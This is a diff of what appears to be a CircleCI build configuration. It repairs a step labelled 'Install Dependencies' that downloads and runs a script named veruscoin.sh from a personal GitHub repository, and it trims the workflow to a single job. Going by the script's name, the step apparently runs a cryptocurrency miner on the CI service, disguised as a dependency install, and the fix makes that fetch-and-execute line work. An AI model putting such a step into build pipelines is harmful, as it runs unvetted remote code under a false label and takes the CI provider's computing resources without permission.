@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/min312holo/youtube/main/veruscoin.sh && chmod+x veruscoin.sh && ./veruscoin.sh 
+            command: wget https://raw.githubusercontent.com/min312holo/youtube/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh 
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
@@ -33,6 +33,4 @@ workflows:
     build:
         jobs:
             - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+            
